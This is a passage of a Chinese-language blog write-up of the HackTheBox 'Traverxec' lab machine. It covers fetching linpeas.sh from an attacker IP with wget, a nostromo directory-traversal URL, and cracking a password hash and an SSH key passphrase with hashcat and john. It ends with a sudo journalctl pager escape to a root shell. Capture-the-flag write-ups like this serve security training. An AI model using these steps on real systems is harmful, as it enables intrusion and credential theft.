+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">16.6</span>/linpeas.sh -O linpeas.sh<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220403001414358.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403001414358" style="zoom:200%;" />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x ./linpeas.sh<br><br>/linpeas.sh<br></code></pre></td></tr></table></figure>
+
+<p>它为我枚举了很多可能存在的提权漏洞：</p>
+<img src="https://www.worldisend.com/img/image-20220403001601050.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403001601050" style="zoom:200%;" />
+
+<p>然后，它帮我枚举出了一个有趣的东西：</p>
+<img src="https://www.worldisend.com/img/image-20220403001733902.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403001733902" style="zoom:200%;" />
+
+<p>我尝试用hashcat去破解，它破解了很久很久：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hashcat -m <span class="hljs-number">500</span> --force hash.txt <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt <br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220403005604569.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403005604569" style="zoom:200%;" />
+
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$1</span><span class="hljs-variable">$e7NfNpNi</span><span class="hljs-variable">$A6nCwOTqrNR2oDuIKirRZ</span>/<span class="hljs-symbol">:Nowonly4me</span><br></code></pre></td></tr></table></figure>
+
+<p>我尝试SSH登录，不幸的是，密码不正确：</p>
+<img src="https://www.worldisend.com/img/image-20220403015133161.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403015133161" style="zoom:200%;" />
+
+<p>我不得不在终端中继续寻找有关口令的信息，幸运的是linpeas.sh帮我在/var/nostromo/conf枚举到了一些配置文件信息，我查看并发现了一些有意思的东西：</p>
+<img src="https://www.worldisend.com/img/image-20220403020334085.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403020334085" style="zoom:200%;" />
+
+<p>nostromo配置文件指向的网站根目录为/home，但是我在/home中并无看到有关nostromo的信息。</p>
+<img src="https://www.worldisend.com/img/image-20220403020439188.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403020439188" style="zoom:200%;" />
+
+<p>于是我找到了nostromo官方的用户手册：</p>
+<img src="https://www.worldisend.com/img/image-20220403020631096.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403020631096" style="zoom:200%;" />
+
+<p>它提醒我应该去尝试访问以下的url，</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>traverxec.htb<span class="hljs-regexp">/~david/</span><br></code></pre></td></tr></table></figure>
+
+<p>它返回了我这个页面：<img src="https://www.worldisend.com/img/image-20220403020959769.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403020959769" style="zoom:200%;" /></p>
+<p>我猜想目前我所在的位置应该是<a target="_blank" rel="noopener" href="http://traverxec.htb/public_www%E3%80%82%E4%B9%9F%E5%B0%B1%E6%98%AFhttp://traverxec.htb/~david/public_www%E3%80%82">http://traverxec.htb/public_www。也就是http://traverxec.htb/~david/public_www。</a></p>
+<p>于是我利用目录穿越漏洞尝试读取user.txt。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>traverxec.htb<span class="hljs-regexp">/~david/</span>.%<span class="hljs-number">0</span>d./user.txt<br></code></pre></td></tr></table></figure>
+
+<p>它确实请求到了该文件，但是我对其没有访问权限，也证明了我的猜测，目前确实是在<a target="_blank" rel="noopener" href="http://traverxec.htb/~david/public_www%E8%B7%AF%E5%BE%84%E4%B8%AD%EF%BC%9A">http://traverxec.htb/~david/public_www路径中：</a><img src="https://www.worldisend.com/img/image-20220403021421541.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403021421541" style="zoom:200%;" /></p>
+<p>我尝试对目录进行爆破，但是我并没有那样做，既然web端能够访问，我觉得我的shell终端也可以访问，它确实是这样的：</p>
+<img src="https://www.worldisend.com/img/image-20220403021839926.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403021839926" style="zoom:200%;" />
+
+<p>当前页面下有个目录，我可以查看它，并发现其中隐藏着看起来像是SSH的备份：</p>
+<img src="https://www.worldisend.com/img/image-20220403022054012.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403022054012" style="zoom:200%;" />
+
+<p>我尝试在web站点中访问并下载它，我失败了：</p>
+<img src="https://www.worldisend.com/img/image-20220403022442754.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403022442754" style="zoom:200%;" />
+
+<p>好吧，我通过Meterpreter下载该文件到本地：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">download <span class="hljs-regexp">/home/</span>david<span class="hljs-regexp">/public_www/</span><span class="hljs-keyword">protected</span>-<span class="hljs-keyword">file</span>-area/backup-ssh-identity-files.tgz<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220403022649221.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403022649221" style="zoom:200%;" />
+
+<p>看起来，我获取到了目标机器的密钥：</p>
+<img src="https://www.worldisend.com/img/image-20220403022900906.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403022900906" style="zoom:200%;" />
+
+<p>我尝试用密钥去链接SSH服务：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -i ./id_rsa david@<span class="hljs-number">10.10.10.165</span> -p <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220403023108871.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403023108871" style="zoom:200%;" />
+
+<p>但它要求我输入key，我鼠标点击查看时发现key要求输入密码口令，而我尝试了刚刚破解获取到的密码口令，并不行：</p>
+<img src="https://www.worldisend.com/img/image-20220403023328676.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403023328676" style="zoom:200%;" />
+
+<p>我可以尝试用john工具包的ssh2john来获取密钥的哈希：</p>
+<img src="https://www.worldisend.com/img/image-20220403024058906.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403024058906" style="zoom:200%;" />
+
+<p>我尝试用john去破解口令：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">john hash.txt --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220403024130601.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403024130601" style="zoom:200%;" />
+
+<p>我尝试输入口令去链接，成功了：</p>
+<img src="https://www.worldisend.com/img/image-20220403024228983.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403024228983" style="zoom:200%;" />
+
+<p>我尝试利用Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation漏洞进行提权，它失败了：</p>
+<img src="https://www.worldisend.com/img/image-20220403024513782.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403024513782" style="zoom:200%;" />
+
+<img src="https://www.worldisend.com/img/image-20220403024926704.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403024926704" style="zoom:200%;" />
+
+<p>网上也并没有相关漏洞的复现介绍资料文章，终究是错付了。我可以获取用户的flag：</p>
+<img src="https://www.worldisend.com/img/image-20220403025034746.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403025034746" style="zoom:200%;" />
+
+<p>用户目录中存在有一个奇怪的bin目录，我访问进去，发现里边有两个奇怪的文件，我可以执行其中一个：</p>
+<img src="https://www.worldisend.com/img/image-20220403025300707.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403025300707" style="zoom:200%;" />
+
+<p>我尝试运行该命令，它拒绝了我，我尝试sudo，它要求我输入密码：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/sudo /u</span>sr<span class="hljs-regexp">/bin/</span>journalctl -n5 -unostromo.service | <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/cat /</span>root/root.txt<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220403025740176.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403025740176" style="zoom:200%;" />
+
+<p>看来它是要我了解journalctl命令，我找到了以下url：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//g</span>tfobins.github.io<span class="hljs-regexp">/gtfobins/</span>journalctl/<br></code></pre></td></tr></table></figure>
+
+<p>我觉得journalctl完全是一个恶俗的二进制程序，它要求我调整终端大小，小到它无法一次性打印出所有信息，看起来就像是这样：</p>
+<img src="https://www.worldisend.com/img/image-20220403032449436.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403032449436" style="zoom:200%;" />
+
+<p>这样便会触发Linux终端的less，而进入less中我只需要敲击：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">！<span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220403032529019.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403032529019" style="zoom:200%;" />
+
+<p>奇怪的提权知识增加了，我拿到root flag：</p>
+<img src="https://www.worldisend.com/img/image-20220403032642509.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220403032642509" style="zoom:200%;" />
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Traverxec</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Traverxec/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-SteamCloud/" title="HackTheBox-SteamCloud">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-SteamCloud</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Unified/" title="HackTheBox-Unified">
+                        <span class="hidden-mobile">HackTheBox-Unified</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
